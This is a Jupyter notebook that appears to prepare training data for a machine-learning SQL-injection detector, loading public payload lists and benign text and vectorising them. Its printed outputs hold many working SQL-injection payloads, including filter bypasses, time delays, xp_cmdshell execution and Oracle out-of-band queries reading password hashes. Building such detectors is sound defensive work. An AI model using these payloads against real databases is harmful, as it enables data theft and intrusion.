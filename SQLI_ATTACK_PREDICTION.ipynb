{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Using TensorFlow backend.\n"
     ]
    }
   ],
   "source": [
    "import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk\n",
    "import pandas as pd\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: git_foospidy_payloads_fuzzing_code_db_sqli.txt\n",
    "##### Comments :  \n",
    "1. removed \\n at the end of each line\n",
    "2.  replaced %20 by space\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_fuzzing_code_db_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_fuzzing.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\\n\", \"'+sqlvuln\\n\", 'sqlvuln;\\n', '(sqlvuln)\\n', \"a' or 1=1--\\n\"]"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(sql_lines_fuzzing)):\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('\\n', '')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('%20', ' ')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('=', ' = ')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('((', ' (( ')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('))', ' )) ')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace('(', ' ( ')\n",
    "    sql_lines_fuzzing[i]=sql_lines_fuzzing[i].replace(')', ' ) ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1  =  1--\",\n",
       " '\"a\"\" or 1  =  1--\"',\n",
       " ' or a   =   a',\n",
       " \"a' or 'a'   =   'a\",\n",
       " '1 or 1  =  1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q   =  ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000',\n",
       " 'declare @s varchar ( 22 )  select @s   =  ',\n",
       " '0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 8000 )  select @s   =   0x73656c65637420404076657273696f6e',\n",
       " 'exec ( @s ) ',\n",
       " \"a'\",\n",
       " '?',\n",
       " \"' or 1  =  1\",\n",
       " '‘ or 1  =  1 --',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " \"x' AND email IS NULL; --\",\n",
       " \"anything' OR 'x'  =  'x\",\n",
       " \"x' AND 1  =   ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " '23 OR 1  =  1',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"'\",\n",
       " \"' or ''  =  '\",\n",
       " \"' or 'x'  =  'x\",\n",
       " ' or x  =  x',\n",
       " \"' )  or  ( 'x'  =  'x\",\n",
       " '0 or 1  =  1',\n",
       " \"' or 0  =  0 --\",\n",
       " '\" or 0  =  0 --',\n",
       " 'or 0  =  0 --',\n",
       " \"' or 0  =  0 #\",\n",
       " ' or 0  =  0 #\"',\n",
       " 'or 0  =  0 #',\n",
       " \"' or 1  =  1--\"]"
      ]
     },
     "execution_count": 93,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:45]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_camoufl4g3.txt\n",
    "##### Comments : ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_camoufl4g3.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_camoufl4g3.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n']"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(sql_lines_camoufl4g3)):\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('\\n', '')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('%20', ' ')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('=', ' = ')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('((', ' (( ')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('))', ' )) ')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace('(', ' ( ')\n",
    "    sql_lines_camoufl4g3[i]=sql_lines_camoufl4g3[i].replace(')', ' ) ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"']"
      ]
     },
     "execution_count": 95,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_libinjection-bypasses.txt\n",
    "##### Comments: Should Remove &()o1: from start of each sentence\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_libinjection-bypasses.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_bypasses.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(sql_lines_camoufl4g3)):\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('\\n', '')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('%20', ' ')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('=', ' = ')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('((', ' (( ')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('))', ' )) ')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace('(', ' ( ')\n",
    "    sql_lines_bypasses[i]=sql_lines_bypasses[i].replace(')', ' ) ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id   =   1 or  ( \\\\ )    =   1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id   =   1 or  ( \\\\. )    =   1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id   =   1 or  ( \\\\+ )    =   1 or 1   =   1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id   =   1 or  ( 1 )    =   1 union select 1,banner from v$version where rownum   =   1 -- 1',\n",
       " '& ( 1UE: select * from users where id   =   1 or  ( \\\\+ )    =   1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 97,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
    "sql_lines_parsed=[]\n",
    "for i in range(len(sql_lines_bypasses)):\n",
    "    sentence=sql_lines_bypasses[i]\n",
    "    sentence=sentence.split(':')[1]\n",
    "    sql_lines_parsed.append(sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id   =   1 or  ( \\\\ )    =   1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id   =   1 or  ( \\\\. )    =   1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id   =   1 or  ( \\\\+ )    =   1 or 1   =   1 -- 1',\n",
       " ' select * from users where id   =   1 or  ( 1 )    =   1 union select 1,banner from v$version where rownum   =   1 -- 1',\n",
       " ' select * from users where id   =   1 or  ( \\\\+ )    =   1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_parsed[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_owasp_sqli.txt\n",
    "##### Comments: ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_owasp_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_owasp=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_owasp.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a\\n',\n",
       " \"a' \\n\",\n",
       " \"a' --\\n\",\n",
       " \"a' or 1=1; --\\n\",\n",
       " '@\\n',\n",
       " '?\\n',\n",
       " \"' and 1=0) union all\\n\",\n",
       " '? or 1=1 --\\n',\n",
       " \"x' and userid is NULL; --\\n\",\n",
       " \"x' and email is NULL; --\\n\",\n",
       " \"anything' or 'x'='x\\n\",\n",
       " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
       " \"x' and members.email is NULL; --\\n\",\n",
       " \"x' or full_name like '%bob%\\n\",\n",
       " '23 or 1=1; --\\n']"
      ]
     },
     "execution_count": 86,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[0:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(sql_lines_owasp)):\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('\\n', '')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('%20', ' ')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('=', ' = ')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('((', ' (( ')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('))', ' )) ')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace('(', ' ( ')\n",
    "    sql_lines_owasp[i]=sql_lines_owasp[i].replace(')', ' ) ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --']"
      ]
     },
     "execution_count": 88,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_seclist_fuzzing_sqli_Generic-SQLi.txt\n",
    "##### comments: should we remove %20 by spaces because %20 equals to space\n",
    "#### Source: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_seclist_fuzzing_sqli_Generic-SQLi.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_Generic.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(sql_lines_Generic)):\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('\\n', '')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('%20', ' ')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('=', ' = ')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('((', ' (( ')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('))', ' )) ')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace('(', ' ( ')\n",
    "    sql_lines_Generic[i]=sql_lines_Generic[i].replace(')', ' ) ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: scottparker_ml_sqli_src__trainingdata_plain.txt\n",
    "##### Comments: Should I remove data containing urls\n",
    "#### Source: https://github.com/tungpv98/Detect-Sql-Injection-by-Machine-Learning/tree/ebeb3287931677a3a42f11a7a08dbc13e374ff05/Sql-Injection/source/trainingdata"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/'\n",
    "file=\"scottparker_ml_sqli_src__trainingdata_plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Ne te quaesiveris extra.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                      Ne te quaesiveris extra.\n",
       "2    Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'comment6, http://www.thejustincredible.com/queer/pdf-14218-236-the_walker_bedtime_book.html The Walker Bedtime Book,  gryvhg, http://www.millymillz.com/fat-acceptance/pdf-14077-374-look_back_in_anger.html Look Back in Anger,  05830, http://www.nicholasfrance.com/humanities/pdf-14281-148-mirror_image.html Mirror Image,  >:-OO, http://www.thejustincredible.com/historical-fiction/pdf-14312-117-seeing_the_invisible_pb_champions_of_the_faith_.html SEEING THE INVISIBLE PB (Champions of the faith),  >:-D, http://www.warintheheavens.com/italian-literature/pdf-14354-67-praying_to_get_results.html Praying to Get Results,  obtlvd, http://www.michelleandnaf.com/feminist-studies/pdf-13931-334-the_divine_pity.html The Divine Pity'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['benign'][3693]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3694\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(df))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SQL fuzzing : 142  camoufl4gs : 77 parsed : 474 owasp : 167 generic : 268 \n",
      " total sql injection data : 1128 \n"
     ]
    }
   ],
   "source": [
    "print(f\"SQL fuzzing : {len(sql_lines_fuzzing)}  camoufl4gs : {len(sql_lines_camoufl4g3)} parsed : {len(sql_lines_parsed)} owasp : {len(sql_lines_owasp)} generic : {len(sql_lines_Generic)} \\n total sql injection data : {len(sql_lines_Generic)+len(sql_lines_owasp)+len(sql_lines_parsed)+len(sql_lines_camoufl4g3)+len(sql_lines_fuzzing)} \")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### combination"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentence=sql_lines_owasp+sql_lines_parsed+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1128"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.feature_extraction.text import TfidfVectorizer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "vectorizer = TfidfVectorizer()\n",
    "X = vectorizer.fit_transform(all_sqli_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<1128x271 sparse matrix of type '<class 'numpy.float64'>'\n",
       "\twith 5113 stored elements in Compressed Sparse Row format>"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "X=df['benign'].values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "vectorizer = TfidfVectorizer()\n",
    "X = vectorizer.fit_transform(X)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<3694x10402 sparse matrix of type '<class 'numpy.float64'>'\n",
       "\twith 56418 stored elements in Compressed Sparse Row format>"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<1x10402 sparse matrix of type '<class 'numpy.float64'>'\n",
       "\twith 4 stored elements in Compressed Sparse Row format>"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_data=''\n",
    "for i in all_sqli_sentence:\n",
    "    all_sqli_data+= \" \" + i"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' a  a\\'   a\\' --  a\\' or 1=1; --  @  ?  \\' and 1=0) union all  ? or 1=1 --  x\\' and userid is NULL; --  x\\' and email is NULL; --  anything\\' or \\'x\\'=\\'x  x\\' and 1=(select count(*) from tabname); --  x\\' and members.email is NULL; --  x\\' or full_name like \\'%bob%  23 or 1=1; --  \\'; exec master..xp_cmdshell \\'ping 172.10.1.255\\'--  a  1 or 1=1  1\\' or \\'1\\'=\\'1  1 and user_name() = \\'dbo\\'  1  1\\'1  1 exec sp_ (or exec xp_)  1 and 1=1  1\\' and 1=(select count(*) from tablenames); --  1  1 and user_name() = \\'dbo\\'  \\\\\\'; desc users; --  1\\\\\\'1  1\\' and non_existant_table = \\'1  \\' or username is not NULL or username = \\'  1 and ascii(lower(substring((select top 1 name from sysobjects where xtype=\\'u\\'), 1, 1))) > 116  1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = \\'u\\' --  1 uni/**/on select all from where  ’ or ‘1’=’1  \\' or \\'1\\'=\\'1  \\'||utl_http.request(\\'httP://192.168.1.1/\\')||\\'  \\' || myappadmin.adduser(\\'admin\\', \\'newpass\\') || \\'  \\' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND \\'i\\'=\\'i  \\' AND 